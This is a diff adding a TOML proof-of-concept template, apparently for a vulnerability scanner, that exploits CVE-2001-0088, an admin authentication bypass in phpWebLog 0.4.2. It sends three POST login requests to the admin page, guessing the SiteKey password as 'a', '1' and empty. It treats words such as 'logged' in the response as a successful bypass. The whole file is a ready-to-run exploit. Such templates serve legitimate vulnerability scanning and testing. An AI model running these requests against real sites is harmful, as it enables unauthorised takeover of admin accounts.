@@ -1,0 +1,84 @@
+[info]
+author = "AVE"
+description = "phpWebLog 0.4.2 的 common.inc.php 未正确初始化 $CONF 数组，导致管理员密码被意外设置为单个字符。远程攻击者可通过尝试常见单字符作为 SiteKey 密码绕过管理员认证，获取后台完全控制权限。"
+id = "POC-AVE-2001-0612"
+name = "phpWebLog 管理员认证绕过 PoC"
+severity = "high"
+tags = [
+    "cve-2001-0088",
+    "phpweblog",
+    "auth-bypass",
+]
+vuln_id = [
+    "CVE-2001-0088",
+    "AVE-2001-0612",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admin/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "sitekey=a&action=login"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "session_start",
+    "admin.php",
+    "logged",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admin/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "sitekey=1&action=login"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "session_start",
+    "admin.php",
+    "logged",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admin/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "sitekey=&action=login"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "session_start",
+    "admin.php",
+    "logged",
+]
